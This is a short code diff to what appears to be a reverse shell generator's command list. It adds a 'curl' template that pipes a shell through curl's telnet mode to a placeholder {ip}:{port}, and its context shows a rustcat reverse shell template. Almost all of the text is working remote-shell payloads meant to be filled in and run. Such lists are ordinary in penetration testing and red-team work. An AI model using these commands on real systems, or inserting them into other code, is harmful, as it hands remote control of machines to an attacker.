@@ -87,6 +87,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "mac"]
         },
         {
+            "name": "curl",
+            "command": "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",
+            "meta": ["linux", "mac"]
+        },
+        {
             "name": "rustcat",
             "command": "rcat connect -s {shell} {ip} {port}",
             "meta": ["linux", "mac"]
